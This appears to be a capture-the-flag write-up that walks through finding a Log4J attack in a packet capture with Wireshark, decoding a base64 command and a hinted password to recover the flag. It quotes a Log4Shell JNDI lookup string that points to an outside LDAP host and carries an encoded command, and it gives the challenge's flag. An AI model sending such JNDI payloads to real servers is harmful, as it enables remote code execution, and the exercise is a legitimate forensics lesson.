# Log4jVulnAttack | Difficulty: Medium

## Requirements:

- Anaylzing PCAP file using software like Wireshark
- Base understanding about Log4J CVE-2021-45105 and how attacks are done

---

## Steps:

1.  Open `packets.pcap` using any packet analysis software you want. I will be using `Wireshark`.
2.  Identify that a potential Log4J attack might have occured.

    You can determine by searching for any packets using the `LDAP` protocol or whether any IPs contains the word `jndi` in them.

    *[Image: LDAP search]*
    *[Image: jdni search]*

3.  There is a very suspicious `HTTP` packet found from the second search.

    From our search for whether any IP contains jndi, we noticed a suspicious packet.\
    Let us examine this packet further.

    You can right-click on the packet in `Wireshark` and select the option: `Follow -> HTTP Stream`.

    *[Image: Follow stream]*

    From this we can extract two pieces of information:

    ```
    # FIRST INFORMATION
    ${jndi:ldap://52.221.178.168:389/Basic/Command/Base64/ZWNobyAnVTJGc2RHVmtYMThwTjlQZzBKemIzMnM3VGhYUTQycVJmQ1dVTkpPbFhpdnk1UTFITk9OdFFBMzBpbituU0JrTycgfCBvcGVuc3NsIGFlcy0yNTYtY2JjIC1hIC1kIC1zYWx0}
    ```

    ```
    # SECOND INFORMATION
    I wonder what this is: aV9saWtlX3RoaXNfa2V5  Maybe its a password OR an 3Nc0d3d one...
    ```

4.  Decode the `Base64` string found in the first info.

    There appears to be a Base64 Command in the first info we have:

    ${jndi:ldap://52.221.178.168:389/Basic/Command/**Base64**/`ZWNobyAnVTJGc2RHVmtYMThwTjlQZzBKemIzMnM3VGhYUTQycVJmQ1dVTkpPbFhpdnk1UTFITk9OdFFBMzBpbituU0JrTycgfCBvcGVuc3NsIGFlcy0yNTYtY2JjIC1hIC1kIC1zYWx0`}

    Let decode this into `UTF-8` (text):

    ```
    ZWNobyAnVTJGc2RHVmtYMThwTjlQZzBKemIzMnM3VGhYUTQycVJmQ1dVTkpPbFhpdnk1UTFITk9OdFFBMzBpbituU0JrTycgfCBvcGVuc3NsIGFlcy0yNTYtY2JjIC1hIC1kIC1zYWx0
    ```

    Using any decoder you wish, it will decode to:

    ```bash
    echo 'U2FsdGVkX18pN9Pg0Jzb32s7ThXQ42qRfCWUNJOlXivy5Q1HNONtQA30in+nSBkO' | openssl aes-256-cbc -a -d -salt
    ```

    Let us try running this command in our terminal and seeing what happens:

    *[Image: Trying command]*

    It seems to require a password. Perhaps this is what the second piece of info is for.

5.  Examine the second info.

    ```
    I wonder what this is: aV9saWtlX3RoaXNfa2V5  Maybe its a password OR an 3Nc0d3d one...
    ```

    It is prompting us that the string `aV9saWtlX3RoaXNfa2V5` is either the password or connected to it somehow.

    First let us try using it as the password for the earlier command:

    *[Image: Trying-Decrypt]*

    It lead to a bad decrypt which means that it isn't the password directly.\
    The message also hinted to us that it might have been `encoded` (3Nc0d3d).

    You can try decoding it using many different forms of encoding but let us try decoding it as `base64` and seeing the result:

    ```
    aV9saWtlX3RoaXNfa2V5
    ```

    Using any decoder you wish, results in:

    ```
    i_like_this_key
    ```

    Let us try using this new string: `i_like_this_key` as the password for the earlier command:

    *[Image: Success-Decrypt]*

    Success! We have found the flag.

         flag@log4j_vuln_is_crazy
